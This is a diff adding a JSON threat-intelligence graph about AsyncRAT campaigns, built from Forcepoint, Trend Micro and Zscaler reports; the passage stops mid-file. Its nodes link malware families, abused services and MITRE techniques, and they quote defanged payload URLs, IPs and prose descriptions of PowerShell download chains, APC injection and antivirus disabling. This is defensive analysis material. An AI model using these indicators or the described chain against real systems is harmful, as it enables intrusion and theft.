@@ -1,0 +1,4051 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0607bb9bb168",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Dropbox",
+        "edges": [
+          "EDGE_590f2ce7205b",
+          "EDGE_8790d80d1ece",
+          "EDGE_c4afabd72079"
+        ],
+        "source": {
+          "Dropbox_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              6,
+              "This campaign begins with a phishing email containing a Dropbox URL."
+            ],
+            [
+              14,
+              "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file."
+            ],
+            [
+              41,
+              "Payloads are downloaded through Dropbox URLs and temporary TryCloudflare tunnel infrastructure, thereby tricking recipients into believing their legitimacy."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0e005d2a24a7",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "XWorm",
+        "edges": [
+          "EDGE_37922bfe33e8"
+        ],
+        "source": {
+          "XWorm_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              38,
+              "Payload.bin file injects VenomRat shellcode into legitimate notepad.exe process and xr.bin injects XWorm shell code, but all others inject AsyncRAT shell code into legitimate process explorer.exe."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_25ce2fdf283d",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "VenomRat",
+        "edges": [
+          "EDGE_d08f0f8e60b7"
+        ],
+        "source": {
+          "VenomRat_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              38,
+              "Payload.bin file injects VenomRat shellcode into legitimate notepad.exe process and xr.bin injects XWorm shell code, but all others inject AsyncRAT shell code into legitimate process explorer.exe."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_28490c1dcb84",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Forcepoint X-Labs",
+        "edges": [],
+        "source": {
+          "Forcepoint X-Labs_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              2,
+              "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_973c7ab7d44a",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "TryCloudflare",
+        "edges": [
+          "EDGE_bf6b80edeccf",
+          "EDGE_07ed8643100d"
+        ],
+        "source": {
+          "TryCloudflare_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              2,
+              "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+            ],
+            [
+              5,
+              "The use of TryCloudflare in this campaign reinforces our X-Labs prediction from the 2025 Future Insights series, which anticipated that legitimate infrastructure would be exploited in malicious campaigns."
+            ],
+            [
+              16,
+              "On analysing the content of the file, we found that it is embedded with the TryCloudflare URL."
+            ],
+            [
+              20,
+              "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+            ],
+            [
+              23,
+              "We can see that this JS file is then downloading the BAT file from the same TryCloudflare tunnel."
+            ],
+            [
+              40,
+              "This AsyncRAT campaign has again showed how hackers can use legitimate infrastructures like Dropbox URLs and TryCloudflare to their advantage."
+            ],
+            [
+              41,
+              "Payloads are downloaded through Dropbox URLs and temporary TryCloudflare tunnel infrastructure, thereby tricking recipients into believing their legitimacy."
+            ]
+          ],
+          "TryCloudflare_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              1,
+              "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+            ],
+            [
+              12,
+              "When opened, the file redirects users to download multi-stage scripts hosted on TryCloudflare domains."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a4578f2623b0",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "AsyncRAT",
+        "edges": [
+          "EDGE_562234411600",
+          "EDGE_74a2756eec86",
+          "EDGE_95c6fdf6531e",
+          "EDGE_9f1fec8e3945",
+          "EDGE_baa544f5310a",
+          "EDGE_bea7e07df8f9",
+          "EDGE_ced084c84501",
+          "EDGE_ec94a16e0ef2",
+          "EDGE_1a3ca7c48329",
+          "EDGE_956a657ba8dc",
+          "EDGE_f44ec0ba4995",
+          "EDGE_3ae9e551cee7",
+          "EDGE_3c31a087258f",
+          "EDGE_6bd66c99b194",
+          "EDGE_c6c6a8338d9d"
+        ],
+        "source": {
+          "AsyncRAT_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              0,
+              "AsyncRAT is remote access trojan (RAT) that exploits the async/await pattern for efficient, asynchronous communication."
+            ],
+            [
+              2,
+              "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+            ],
+            [
+              13,
+              "This new ZIP file houses the Python script used to execute the AsyncRAT malware."
+            ],
+            [
+              38,
+              "Payload.bin file injects VenomRat shellcode into legitimate notepad.exe process and xr.bin injects XWorm shell code, but all others inject AsyncRAT shell code into legitimate process explorer.exe."
+            ],
+            [
+              40,
+              "This AsyncRAT campaign has again showed how hackers can use legitimate infrastructures like Dropbox URLs and TryCloudflare to their advantage."
+            ]
+          ],
+          "AsyncRAT_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              0,
+              "Threat actors exploited Cloudflare's free-tier infrastructure and legitimate Python environments to deploy the AsyncRAT remote access trojan, demonstrating advanced evasion techniques that abuse trusted cloud services for malicious operations."
+            ],
+            [
+              5,
+              "Introduction\nAsyncRAT has emerged as a notable Remote Access Trojan (RAT) used by threat actors for its robust capabilities and ease of deployment."
+            ],
+            [
+              10,
+              "This entry dissects the attack chain from initial compromise through AsyncRAT deployment, examining the attacker's techniques for system infiltration and persistent access."
+            ],
+            [
+              33,
+              "Analysis revealed that new.bin contains shellcode, which we identified as AsyncRAT."
+            ],
+            [
+              38,
+              "We successfully extracted all files from one of the active remote servers at 87[.]106[.]191[.]217:5380, which revealed the complete set of files used to install AsyncRAT."
+            ],
+            [
+              46,
+              "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+            ],
+            [
+              49,
+              "Both URLs also retrieve a legitimate PDF file from the website ihk[.]de and host the final payload, which performs code injection into explorer.exe using Python, and ultimately loads the AsyncRAT shell."
+            ],
+            [
+              50,
+              "The AsyncRAT campaign analyzed in this report demonstrates the increasing sophistication of threat actors in abusing legitimate services and open-source tools to evade detection and establish persistent remote access."
+            ]
+          ],
+          "AsyncRAT_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              1,
+              "The end payload of many of these attacks is AsyncRAT, a Remote Access Trojan that can be used to monitor, control, and steal sensitive data from victims' machines."
+            ],
+            [
+              3,
+              "Attackers trick victims using a spoof web page that poses as Thailand Pass, ultimately baiting users into downloading AsyncRAT."
+            ],
+            [
+              14,
+              "While execution flows are modified if AV services are found to be present, the final payload (AsyncRAT malware) remains the same."
+            ],
+            [
+              19,
+              "After disabling the running antivirus service, it downloads the AsyncRAT malware from the killd.txt file and starts its malicious activity on the victim's machine."
+            ],
+            [
+              31,
+              "While decoding the variable $Filc, it results in an AsyncRAT malware file that was hidden inside of it."
+            ],
+            [
+              34,
+              "We have dissected the deobfuscated AsyncRAT to see how the process injection is accomplished."
+            ],
+            [
+              36,
+              "The following APIs are also used to inject the malware AsyncRAT into the legitimate file aspnet_compiler.exe file."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a81bc98d80e7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_fedc2391e361",
+          "EDGE_ff6275ff963c"
+        ],
+        "source": {
+          "PowerShell_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": [
+            [
+              20,
+              "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+            ],
+            [
+              24,
+              "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package."
+            ],
+            [
+              25,
+              "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_40422d3334f9"
+        ],
+        "source": {
+          "PowerShell_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              4,
+              "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+            ],
+            [
+              26,
+              "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip."
+            ],
+            [
+              28,
+              "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+            ],
+            [
+              30,
+              "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man."
+            ],
+            [
+              53,
+              "The attackers’ use of living-off-the-land techniques, including the use of Windows Script Host and PowerShell, further complicates detection and response efforts."
+            ]
+          ],
+          "powershell_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              10,
+              "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”."
+            ],
+            [
+              13,
+              "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script."
+            ]
+          ]
+        },
+        "alias": [
+          "powershell"
+        ]
+      },
+      {
+        "node_id": "HL_548f85d138f6",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cloudflare",
+        "edges": [
+          "EDGE_48412b2bbc22"
+        ],
+        "source": {
+          "Cloudflare_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              0,
+              "Threat actors exploited Cloudflare's free-tier infrastructure and legitimate Python environments to deploy the AsyncRAT remote access trojan, demonstrating advanced evasion techniques that abuse trusted cloud services for malicious operations."
+            ],
+            [
+              1,
+              "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+            ],
+            [
+              8,
+              "The attackers cleverly exploited Cloudflare's free-tier services to host their WebDAV server, abusing the platform's reliability and widespread trust to evade detection."
+            ],
+            [
+              9,
+              "By using Cloudflare's infrastructure, the threat actors masked the malicious activity under legitimate domains, making it challenging for traditional security solutions to identify and block the threat."
+            ],
+            [
+              17,
+              "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names."
+            ],
+            [
+              51,
+              "By utilizing Python-based scripts and abusing Cloudflare’s free-tier infrastructure for hosting malicious payloads, the attackers successfully masked their activities under trusted domains, bypassing traditional security controls."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6a0a95cd84d0",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Dropbox",
+        "edges": [
+          "EDGE_0097d63541aa"
+        ],
+        "source": {
+          "Dropbox_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              3,
+              "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+            ],
+            [
+              11,
+              "During the initial stages of the attack, users received a phishing email containing a Dropbox link leading to an Internet Shortcut file(.url)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_955c7439f454",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Donut",
+        "edges": [],
+        "source": {
+          "Donut_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              45,
+              "When unpacked, these new.bin files were identified to be shellcode files created using Donut, an open-source framework used to generate position-independent shellcode."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_df8c460afb62",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Trend Vision One™",
+        "edges": [],
+        "source": {
+          "Trend Vision One™_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              39,
+              "The remote server contained all the files that we observed using Trend Vision One™."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_eb6a7b174a27",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Python 3.14.0",
+        "edges": [],
+        "source": {
+          "Python 3.14.0_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              26,
+              "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip."
+            ],
+            [
+              29,
+              "The downloaded file, in this specific case, is an embedded version of Python 3.14.0 for 64-bit Windows systems, which is saved as p.zip."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_eb8915b8d64e",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Windows Script Host",
+        "edges": [
+          "EDGE_4f7ab8ae5ceb",
+          "EDGE_c194b4a41891"
+        ],
+        "source": {
+          "Windows Script Host_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              4,
+              "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+            ],
+            [
+              7,
+              "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server."
+            ],
+            [
+              53,
+              "The attackers’ use of living-off-the-land techniques, including the use of Windows Script Host and PowerShell, further complicates detection and response efforts."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4c12b0f7e5aa",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "ESET",
+        "edges": [
+          "EDGE_76ac9577b6a7",
+          "EDGE_a5a4ac149217"
+        ],
+        "source": {
+          "ESET_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              11,
+              "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_7dc7fe42ab43",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Avast",
+        "edges": [
+          "EDGE_5037c22a73cc",
+          "EDGE_ad3e117c0c94"
+        ],
+        "source": {
+          "Avast_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              11,
+              "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8d8305c76d1a",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AVG",
+        "edges": [
+          "EDGE_981f36c7a931",
+          "EDGE_d813c89110c0"
+        ],
+        "source": {
+          "AVG_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              11,
+              "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8e1659bea8b4",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Zscaler ThreatLabz",
+        "edges": [],
+        "source": {
+          "Zscaler ThreatLabz_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              0,
+              "The Zscaler ThreatLabz research team has recently discovered a malware campaign targeting users applying for Thailand travel passes."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_955c2dd1add1",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Thailand Pass",
+        "edges": [],
+        "source": {
+          "Thailand Pass_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              2,
+              "Thailand Pass is an online travel agency that brokers airline tickets to travelers who want to visit Thailand or other foreign countries."
+            ],
+            [
+              3,
+              "Attackers trick victims using a spoof web page that poses as Thailand Pass, ultimately baiting users into downloading AsyncRAT."
+            ],
+            [
+              4,
+              "The Thailand Pass organization has issued an advisory for these malicious campaigns on their official website \"tp.consular[.]go[.]th\" as shown below."
+            ],
+            [
+              40,
+              "We have seen several other Thailand Pass organization spam templates that directly deliver the VBScript file that leads to the delivery of the same AsyncRAT malware, as shown below."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e4c3acfd2691",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Malwarebytes",
+        "edges": [
+          "EDGE_08a3b1a1d90f",
+          "EDGE_e508440482f0"
+        ],
+        "source": {
+          "Malwarebytes_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              11,
+              "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+            ],
+            [
+              15,
+              "Here, we have taken a case study of a host with malwarebytes antivirus installed, and will analyze the delivery of an AsyncRAT payload in detail."
+            ],
+            [
+              18,
+              "The final goal of the “1.ps1” powershell script is to stop the MalwareBytes service and add exclusion for the supporting files during the real time scanning as depicted below."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f0730fc60dca",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Thailand",
+        "edges": [],
+        "source": {
+          "Thailand_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              0,
+              "The Zscaler ThreatLabz research team has recently discovered a malware campaign targeting users applying for Thailand travel passes."
+            ],
+            [
+              2,
+              "Thailand Pass is an online travel agency that brokers airline tickets to travelers who want to visit Thailand or other foreign countries."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+            "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+            "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+            "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+            "However, most of these files are used for typical Python setup."
+          ],
+          [
+            "The campaign employs a multi-step process to evade detection, starting with the execution of an LNK file, then running a JS file, followed by downloading a BAT file, eventually retrieving an obfuscated BAT file that extracts malicious Python scripts."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            28
+          ],
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_ec94a16e0ef2",
+          "EDGE_6188e7c53930"
+        ],
+        "source": {
+          "TTP:T1027_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                24,
+                28
+              ],
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+                "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+                "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+                "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+                "However, most of these files are used for typical Python setup."
+              ],
+              [
+                "The campaign employs a multi-step process to evade detection, starting with the execution of an LNK file, then running a JS file, followed by downloading a BAT file, eventually retrieving an obfuscated BAT file that extracts malicious Python scripts."
+              ]
+            ]
+          },
+          "TTP:T1027_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                43,
+                43
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1055",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1055",
+        "ttp_id": "T1055",
+        "best_span_sentences_list": [
+          [
+            "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+            "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+            "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+            "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+            "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+          ],
+          [
+            "Payload.bin file injects VenomRat shellcode into legitimate notepad.exe process and xr.bin injects XWorm shell code, but all others inject AsyncRAT shell code into legitimate process explorer.exe."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            31,
+            35
+          ],
+          [
+            38,
+            38
+          ]
+        ],
+        "edges": [
+          "EDGE_37922bfe33e8",
+          "EDGE_562234411600",
+          "EDGE_d08f0f8e60b7",
+          "EDGE_0abbb7368fde",
+          "EDGE_9b612a613039",
+          "EDGE_d0181937f7e8",
+          "EDGE_f8ce0dd09a34",
+          "EDGE_bc72188e89a6"
+        ],
+        "source": {
+          "TTP:T1055_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                31,
+                35
+              ],
+              [
+                38,
+                38
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+                "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+                "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+                "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+                "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+              ],
+              [
+                "Payload.bin file injects VenomRat shellcode into legitimate notepad.exe process and xr.bin injects XWorm shell code, but all others inject AsyncRAT shell code into legitimate process explorer.exe."
+              ]
+            ]
+          },
+          "TTP:T1055_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                32,
+                32
+              ],
+              [
+                40,
+                40
+              ],
+              [
+                44,
+                44
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes."
+              ],
+              [
+                "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+              ],
+              [
+                "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process."
+              ],
+              [
+                "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection."
+              ]
+            ]
+          },
+          "TTP:T1055_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                29,
+                29
+              ],
+              [
+                33,
+                33
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The variable $Filc contains the actual AsyncRAT malware payload, which is injected into a legitimate aspnet_compiler.exe file to show it as a genuine file running in background."
+              ],
+              [
+                "The injected malware payload runs as a legitimate aspnet_compiler.exe process as shown below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "It allows attackers control infected systems stealthily, exfiltrate data and execute commands while remaining hidden—making it a significant cyberthreat.",
+            "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+          ],
+          [
+            "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+            "This file leads to a .lnk file, which then leads to a JavaScript file.",
+            "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
+            "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+            "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file.",
+            "This zip files consists of the .URL file which is an internet shortcut file."
+          ],
+          [
+            "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+          ],
+          [
+            "On deobfuscating the JavaScript file, we get the following code.",
+            "We can see that this JS file is then downloading the BAT file from the same TryCloudflare tunnel.",
+            "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+            "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+            "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+            "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+            "However, most of these files are used for typical Python setup.",
+            "These Python packages enable attackers to run the malicious Python code, even if Python is not installed locally."
+          ],
+          [
+            "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+            "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+            "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+            "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+            "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+          ],
+          [
+            "The campaign employs a multi-step process to evade detection, starting with the execution of an LNK file, then running a JS file, followed by downloading a BAT file, eventually retrieving an obfuscated BAT file that extracts malicious Python scripts."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            2
+          ],
+          [
+            10,
+            15
+          ],
+          [
+            20,
+            20
+          ],
+          [
+            22,
+            29
+          ],
+          [
+            31,
+            35
+          ],
+          [
+            42,
+            42
+          ]
+        ],
+        "edges": [
+          "EDGE_74a2756eec86",
+          "EDGE_fedc2391e361",
+          "EDGE_04ef99d90e9a",
+          "EDGE_105002f3e531",
+          "EDGE_1330cf3c1d72",
+          "EDGE_1bcf824222e5",
+          "EDGE_2bc527a5e896",
+          "EDGE_3f5468d8ac7c",
+          "EDGE_6b9e41313542",
+          "EDGE_82df7e2b6e6f",
+          "EDGE_a7fbe2bdf092",
+          "EDGE_c194b4a41891",
+          "EDGE_e63de98c7edf",
+          "EDGE_f9586280275b",
+          "EDGE_0105c58b4da7",
+          "EDGE_11f3d1f34667",
+          "EDGE_12ca7069a8af",
+          "EDGE_3e4a0e948199",
+          "EDGE_5297c8e43949",
+          "EDGE_6f40216b6f8e",
+          "EDGE_91131338c030",
+          "EDGE_c4f13684bfcc",
+          "EDGE_cb5ba7a3f9fe",
+          "EDGE_ec42f57d191e",
+          "EDGE_edd799a4ae7b",
+          "EDGE_efdf97ac55ca"
+        ],
+        "source": {
+          "TTP:T1059_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                1,
+                2
+              ],
+              [
+                10,
+                15
+              ],
+              [
+                20,
+                20
+              ],
+              [
+                22,
+                29
+              ],
+              [
+                31,
+                35
+              ],
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It allows attackers control infected systems stealthily, exfiltrate data and execute commands while remaining hidden—making it a significant cyberthreat.",
+                "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+              ],
+              [
+                "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+                "This file leads to a .lnk file, which then leads to a JavaScript file.",
+                "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
